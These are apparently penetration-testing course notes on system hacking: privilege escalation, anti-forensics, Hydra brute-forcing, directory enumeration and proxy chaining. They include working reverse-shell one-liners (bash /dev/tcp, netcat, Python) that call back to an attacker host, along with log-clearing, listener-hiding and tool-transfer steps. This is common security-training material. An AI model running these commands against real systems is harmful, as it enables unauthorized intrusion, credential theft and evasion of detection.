# System Hacking (Module 06)

# Overview
System hacking is the core phase where an attacker exploits vulnerabilities to gain access, elevate privileges, and maintain control over a target system while evading detection.



## 1. Phases of System Hacking

1. **Gaining Access (Initial Foothold):**
   * **Concept:** Breaching system defenses (passwords, firewalls, software flaws) to get the first entry.
   * **Analogy:** Breaking the lock or sneaking through a weak window.
2. **Privilege Escalation:**
   * **Concept:** Elevating permissions from a standard user to Administrator (Windows) or Root (Linux).
3. **Persistence (Maintaining Access):**
   * **Concept:** Deploying mechanisms to ensure continued control even if the system reboots or passwords change.
   * **Analogy:** Leaving the backdoor unlocked or making a duplicate key.
4. **Covering Tracks (Anti-Forensics):**
   * **Concept:** Concealing activities to evade detection by the SOC/Blue Team.
   * **Analogy:** Wiping fingerprints and deleting CCTV footage.

---

## 2. Core Attack Techniques (Initial Access)

* **Password Attacks:** * *Method:* Brute-Force or Dictionary attacks against live logins, or stealing and cracking encrypted password hashes using tools like Hashcat/John the Ripper.
* **Vulnerability Exploitation:** * *Method:* Scanning for outdated software and sending a specific exploit (via Metasploit) to gain a reverse shell.
* **Authentication Bypass:** * *Method:* Bypassing the login mechanism entirely using technical flaws like SQL Injection, avoiding the need to crack passwords.

---

## 3. Privilege Escalation Mastery

Getting a shell usually grants limited (standard user) access. Privilege escalation is required to take full control.

### 🐧 Linux Escalation (Becoming Root)
1. **SUID Binary Exploitation:**
   * *Logic:* Certain files have the 'SUID' bit set, meaning they run with the owner's (usually Root) permissions. Attackers exploit these files to execute commands as Root.
2. **Kernel Vulnerabilities:**
   * *Logic:* Exploiting a bug in the core OS engine (e.g., Dirty COW) to trick the kernel into granting highest privileges.
3. **Sudo Misconfigurations:**
   * *Logic:* Admins sometimes grant normal users the ability to run specific commands without a password using `sudo`. Attackers bypass the intended use of this command to spawn a root shell.
4. **Cron Job Manipulation:**
   * *Logic:* Cron jobs are automated scheduled tasks. If a task runs as root and has weak write permissions, an attacker can inject malicious code into the script.

### 🪟 Windows Escalation (Becoming SYSTEM/Admin)
1. **Token Impersonation:**
   * *Logic:* Windows uses "Access Tokens" for sessions. Tools like Mimikatz/Incognito steal an Administrator's background token to impersonate them.
2. **Service Misconfigurations:**
   * *Logic:* Replacing a legitimate background service executable with a malicious `.exe` due to weak folder permissions. When Windows restarts the service, the malware runs with SYSTEM privileges.
3. **Registry Key Exploitation:**
   * *Logic:* Modifying weakly protected registry keys that control startup programs or services to execute malicious payloads upon reboot.
4. **Scheduled Task Abuse:**
   * *Logic:* Similar to Linux Cron jobs. Modifying the executable of a task scheduled to run as SYSTEM.

---

## 4. Maintaining Access & Covering Tracks

### Malware Deployment
* **Trojans:** Software that appears legitimate (e.g., a cracked game or PDF) but executes a malicious payload in the background.
* **Rootkits:** Deep OS-level malware that hides the attacker's presence, processes, and network connections from Antivirus and Admins.
* **Backdoors:** A hidden script or application left behind to bypass normal authentication on future visits.

### Steganography (Data Exfiltration)
* *Logic:* Hiding stolen data (passwords, PII) inside the pixels or source code of normal Image (`.jpg`), Audio, or Video files. 
* *Purpose:* Network security monitors see a normal image transfer instead of a data leak.

### Anti-Forensics
* **Log Clearing:** Deleting 'Event Logs' (Windows) or `/var/log` (Linux) to wipe the record of logins, file executions, and system changes.
* **Artifact Concealment:** Renaming malware to look like system files (e.g., `svchost.exe`) or placing them in hidden system directories to evade detection.

---

## 5. The Full Attack Chain (Execution Flow)
1. **Discover Directories:** Use `Gobuster` or `Feroxbuster` to find hidden paths (`/admin`, `/backups`).
2. **Brute Force Credentials:** Use `Hydra` to crack the login panel or SSH.
3. **Gain Reverse Shell:** Execute a payload to force the target to connect back to the attacker.
4. **Stabilize Shell:** Upgrade the basic terminal connection to an interactive TTY shell.
5. **Transfer Tools:** Use `Python HTTP Server` or `wget` to upload enumeration scripts.
6. **Escalate Privileges:** Exploit misconfigurations (SUID/Sudo) to become Root.

---

## 6. Traffic Routing & Anonymity

### Proxy Chaining
Routes network traffic through multiple proxy servers sequentially, obscuring the original source IP.

**Setup (`proxychains.conf`):**
1. Edit `/etc/proxychains.conf`.
2. Uncomment `dynamic_chain` and `proxy_dns`. Comment `strict_chain`.
3. Add Tor SOCKS5 at the bottom: `socks5 127.0.0.1 9050`
4. Start Tor: `sudo systemctl start tor`
5. Execute commands: `proxychains nmap -F 10.12.1.3`

### MAC Address Spoofing
```bash
sudo ifconfig eth0 down
sudo macchanger -r eth0
sudo ifconfig eth0 up
macchanger -s eth0

# 7. Web & Directory Enumeration

Systematic testing of wordlist entries against web paths to discover hidden content.

## Tools

### Gobuster
Fast, CLI-based, multi-threaded directory brute-forcer.

```bash
gobuster dir -u http://target.com -w wordlist.txt
```

### Dirbuster
GUI-based tool. Good for beginners to visually manage threads and wordlists.

### Feroxbuster
Modern, Rust-based tool with automatic recursion (it scans inside the hidden folders it finds).

#### Firewall Evasion (Rate Limiting)

```bash
feroxbuster -u http://10.10.10.10 -w common.txt --rate-limit 20
```

---

# 8. Hydra: Password Brute-Forcing

A powerful network login cracker that performs rapid dictionary attacks against numerous protocols.

## Basic Syntax

```bash
hydra -l admin -P passwords.txt ssh://192.168.1.10:2222
```

## Core Flags

| Flag | Description |
|-------|-------------|
| `-l` | Single username |
| `-L` | List of usernames |
| `-p` | Single password |
| `-P` | List of passwords |
| `-t 4` | Number of parallel threads (Keep at 4 to avoid firewall blocking) |
| `-vV` | Verbose mode (Shows real-time attempts) |

## HTTP-POST Form Brute Forcing

### GET vs POST

- If submitted credentials appear in the URL, it's a **GET** request.
- If credentials remain hidden, it's a **POST** request.

### Finding Parameters

Inspect the HTML source code and identify:

- Username field `name` attribute
- Password field `name` attribute
- Submit button parameter
- Exact login failure message

### Command Syntax

```bash
hydra http-post-form "/login.php:user=^USER^&pass=^PASS^&loginBtn=Submit:F=Invalid Login" -L user.txt -P pass.txt -V target.com
```

## Advanced Hydra Tricks

### Extra Checks (`-e nsr`)

Checks the following automatically without a wordlist:

- `n` → Null (blank password)
- `s` → Same as username
- `r` → Reverse of username

### Brute Force Generator (`-x`)

Generates passwords dynamically.

```bash
hydra -l admin -x 4:4:a ssh://192.168.1.10
```

Tests all possible 4-letter combinations.

---

# 9. Reverse Shells & Stabilization

## Reverse Shell vs Bind Shell

### Bind Shell

- Target opens a port and waits for the attacker.
- Usually blocked by modern ingress firewalls.

### Reverse Shell

- Target initiates a connection back to the attacker.
- Helps bypass outbound firewall restrictions and NAT.

## Step 1: Attacker Listener

```bash
nc -lvnp 4444
```

## Step 2: Payloads (Target Execution)

### Bash

```bash
bash -i >& /dev/tcp/<Attacker_IP>/4444 0>&1
```

### Netcat

```bash
nc <Attacker_IP> 4444 -e /bin/sh
```

### Python

```bash
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<Attacker_IP>",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty;pty.spawn("/bin/bash")'
```

### PowerShell

Standard one-liner utilizing `System.Net.Sockets.TCPClient`.

---

## Proxies for Listeners (OpSec)

To hide the true IP address and bypass local router NAT:

### Cloud VPS

Run the listener on a rented cloud server (e.g., DigitalOcean, AWS).

### Ngrok Tunnel

```bash
ngrok tcp 4444
```

Creates a public TCP endpoint that forwards traffic to the local machine.

### Chisel / Tor

Uses encrypted reverse proxies or hidden `.onion` services for enhanced anonymity.

---

## Full Shell Stabilization (TTY Upgrade)

A raw Netcat shell is unstable (for example, pressing `Ctrl+C` may terminate it).

Follow the exact sequence below to upgrade it into a fully interactive TTY.

### Step 1: On Target

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

### Step 2

Press:

```text
Ctrl + Z
```

This backgrounds the shell.

### Step 3: On Attacker Local Terminal

```bash
stty raw -echo; fg
```

(Type blindly and press Enter.)

### Step 4: On Target (Foreground Shell)

```bash
export TERM=xterm
```

### Result

The shell is now:

- Fully interactive
- Supports arrow keys
- Supports tab completion
- Will not terminate when `Ctrl+C` is pressed

---

# 10. Privilege Escalation Resources

## File Transfers

### Python HTTP Server

**Attacker:**

```bash
python3 -m http.server 80
```

**Target:**

```bash
wget http://<IP>/file
```

### SCP Transfer

```bash
scp -P 22 file user@target_ip:/tmp/
```

## Linux Exploitation Tools

### GTFOBins (https://gtfobins.org/)


Used for bypassing local security restrictions and abusing legitimate binaries.

### LinPEAS (https://github.com/peass-ng/PEASS-ng)

Automated Linux enumeration script used during privilege escalation.

### Linux-Exploit-Suggester (https://github.com/The-Z-Labs/linux-exploit-suggester)

Enumerates the system and suggests possible local privilege escalation CVEs.
